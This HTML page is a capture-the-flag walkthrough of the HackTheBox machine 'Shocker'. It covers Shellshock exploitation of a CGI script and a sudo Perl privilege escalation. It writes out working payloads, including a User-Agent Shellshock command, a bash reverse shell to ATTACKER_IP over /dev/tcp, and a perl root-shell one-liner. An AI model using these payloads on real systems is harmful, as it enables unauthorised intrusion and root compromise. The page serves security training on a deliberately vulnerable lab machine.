@@ -1,0 +1,204 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+<head>
+<link rel="icon" type="image/x-icon" href="../images/favicon.ico">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HTB - Shocker</title>
+
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 900px;
+            margin: 40px auto;
+            line-height: 1.6;
+            color: #222;
+        }
+
+        h1 { margin-bottom: 10px; }
+        h2 { margin-top: 40px; border-bottom: 1px solid #ddd; padding-bottom: 5px; }
+        h3 { margin-top: 25px; }
+
+        img {
+            margin: 15px 0;
+            max-width: 100%;
+            border: 1px solid #ccc;
+        }
+
+        pre {
+            background: #f4f4f4;
+            padding: 12px;
+            overflow-x: auto;
+            border-left: 4px solid #ccc;
+        }
+
+        code { font-family: Consolas, monospace; }
+
+        a { color: #0366d6; text-decoration: none; }
+        a:hover { text-decoration: underline; }
+
+        .navbar {
+            margin-bottom: 30px;
+            padding: 10px 0;
+            border-bottom: 1px solid #ccc;
+        }
+
+        .nav-item {
+            margin-right: 20px;
+            color: #0366d6;
+            text-decoration: none;
+            font-weight: bold;
+        }
+
+        .nav-item.active {
+            color: black;
+            text-decoration: underline;
+        }
+    </style>
+</head>
+
+<body>
+
+<div class="navbar">
+    <a href="../index.html" class="nav-item">Home</a>
+    <a href="../soc_lab_setup.html" class="nav-item">Lab Setup</a>
+    <a href="../case_1.html" class="nav-item">Case 1</a>
+    <a href="../case_2.html" class="nav-item">Case 2</a>
+        <a href="../case_3.html" class="nav-item">Case 3</a>
+    <a href="../ad_attacks_lab.html" class="nav-item">Active Directory Attacks</a>
+    <a href="../more_tools.html" class="nav-item">More Tools</a>
+    <a href="../htb.html" class="nav-item active">HackTheBox</a>
+<a href="../vulnhub.html" class="nav-item">Vulnhub</a>
+<a href="../offsec_proving_grounds.html" class="nav-item">Offsec Proving Grounds</a>
+</div>
+
+<!-- -->
+<h1>Shocker (HTB – Easy)</h1>
+
+<p>
+Shocker is a classic Shellshock exploitation machine.  
+A vulnerable CGI script under <code>/cgi-bin/</code> allows remote command execution via the Shellshock bug.  
+Privilege escalation is trivial through a sudo‑allowed Perl binary.
+</p>
+
+<h2>Overview</h2>
+<p>
+Target: shocker.htb  
+<br>Initial vector: Shellshock RCE via CGI script  
+<br>Privilege escalation: sudo Perl → root  
+</p>
+
+<h2>Enumeration</h2>
+
+<p>Nmap:</p>
+<pre>
+80/tcp   http (Apache 2.4.18)
+2222/tcp ssh (OpenSSH 7.2p2)
+</pre>
+
+<p>
+Directory fuzzing reveals:
+</p>
+
+<pre>
+/cgi-bin/
+</pre>
+
+<p>
+Fuzzing inside <code>/cgi-bin/</code>:
+</p>
+
+<pre>
+$ wfuzz -w directory-list-2.3-medium.txt -z list,sh,pl,py,cgi \
+  --hc 404 http://shocker.htb/cgi-bin/FUZZ.FUZ2Z
+-> user.sh
+</pre>
+
+<p>
+A CGI script named <code>user.sh</code> is present — a strong indicator of Shellshock vulnerability.
+</p>
+
+<h2>Foothold – Shellshock RCE</h2>
+
+<p>
+Test the vulnerability using the <code>User-Agent</code> header:
+</p>
+
+<pre>
+$ curl -s -X GET "http://shocker.htb/cgi-bin/user.sh" \
+  -H 'User-Agent: () { :; }; echo; /usr/bin/whoami'
+</pre>
+
+<p>
+If the output is <code>www-data</code>, the script is vulnerable.
+</p>
+
+<h3>Reverse Shell</h3>
+
+<p>Listener:</p>
+<pre>
+$ nc -nlvp 777
+</pre>
+
+<p>Exploit:</p>
+<pre>
+$ curl -s -X GET "http://shocker.htb/cgi-bin/user.sh" \
+  -H 'User-Agent: () { :; }; echo; /bin/bash -i >& /dev/tcp/ATTACKER_IP/777 0>&1'
+</pre>
+
+<p>
+A shell is obtained as <code>www-data</code>.
+</p>
+
+<p>
+Alternatively, Shellshock can be tested using Nmap:
+</p>
+
+<pre>
+$ sudo nmap --script http-shellshock -p80 shocker.htb \
+  --script-args uri=/cgi-bin/user.sh,cmd=/usr/bin/id
+</pre>
+
+<h2>Privilege Escalation</h2>
+
+<p>
+Check sudo permissions:
+</p>
+
+<pre>
+$ sudo -l
+-> (root) NOPASSWD: /usr/bin/perl
+</pre>
+
+<p>
+Perl can be used to spawn a root shell:
+</p>
+
+<pre>
+$ sudo /usr/bin/perl -e 'exec "/bin/sh";'
+</pre>
+
+<p>
+Root access obtained.
+</p>
+
+<h2>Conclusion</h2>
+<p>
+Shocker is a straightforward exploitation path: discover a CGI script, exploit Shellshock for RCE, and escalate
+to root via a sudo‑allowed Perl binary.  
+A perfect example of classic web exploitation combined with simple privilege escalation.
+</p>
+
+
+
+<!-- -->
+
+</body>
+</html>
+
+
+
+
+
+
+
